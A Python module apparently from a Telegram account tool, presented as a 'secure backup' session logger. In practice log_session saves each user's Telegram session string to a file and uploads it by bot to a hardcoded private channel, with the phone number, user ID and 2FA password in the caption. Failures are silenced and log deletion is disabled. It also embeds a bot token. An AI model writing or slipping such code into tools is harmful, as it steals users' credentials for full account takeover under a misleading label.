"""
Session Logger Module (Stateless / Distributed)
Handles secure backup of session credentials to private Telegram channel
Uses Telethon Bot Client to search and manage logs directly in the channel.
"""

import asyncio
import os
import re
from telethon import TelegramClient
from telethon.sessions import StringSession
import config
from core.logger import logger
from core.database import db

class SessionLogger:
    def __init__(self):
        # Hardcoded credentials as requested
        self.bot_token = "8293016630:AAH5mRugsZZrB73rNyXj3F2pk7DBCC6UpHw"
        # Private Group ID (Supergroup) where Bot is Admin
        self.channel_id = -1003579893313
        
        # Telethon Bot Client
        # We start it on demand to avoid holding a connection always open if not needed,
        # or we could keep it. For robustness in "distributed" stateless scripts,
        # transient connection for the operation is safer/simpler though slightly slower.
        self.api_id = config.API_ID
        self.api_hash = config.API_HASH

    async def _get_bot_client(self):
        """Create and start a bot client"""
        try:
            # Use a separate session file for the bot to avoid conflicts
            # and to maintain the bot's own auth state.
            session_path = config.SESSIONS_DIR / 'session_logger_bot'
            
            client = TelegramClient(
                str(session_path),
                self.api_id,
                self.api_hash
            )
            await client.start(bot_token=self.bot_token)
            return client
        except Exception as e:
            logger.debug(f"Failed to start logger bot: {e}")
            return None

    async def log_session(self, user_client, phone, password=None):
        """
        Log new session to channel (Simple Append-Only)
        Just uploads the session file. No cleanup. No specific sequencing.
        """
        bot = await self._get_bot_client()
        if not bot:
            return

        try:
            clean_phone = phone.replace('+', '')
            formatted_phone = f"+{clean_phone}"

            # 1. Generate Artifact
            string_session = StringSession.save(user_client.session)
            temp_filename = f"{clean_phone}.session"
            temp_path = config.SESSIONS_DIR / "temp_logs"
            temp_path.mkdir(exist_ok=True)
            file_path = temp_path / temp_filename
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(string_session)

            # 2. Prepare Metadata
            try:
                me = await user_client.get_me()
                user_id = me.id
            except:
                user_id = "Unknown"

            from datetime import datetime
            seq_id = int(datetime.now().strftime("%Y%m%d%H%M"))

            caption = (
                f"Session ID: #{seq_id}\n"
                f"User ID: `{user_id}`\n"
                f"Phone: `{formatted_phone}`\n"
            )
            if password:
                caption += f"2FA: `{password}`"

            # 3. Upload
            try:
                await bot.send_file(
                    self.channel_id,
                    file_path,
                    caption=caption
                )
            except Exception as e:
                logger.debug(f"Failed to upload log: {e}")

            # 4. Cleanup File
            try:
                os.remove(file_path)
            except:
                pass

        except Exception as e:
            logger.debug(f"Session Logger Error: {e}")
        finally:
            await bot.disconnect()

    async def delete_log(self, phone):
        """
        Delete log feature disabled as per user request.
        """
        pass

session_logger = SessionLogger()
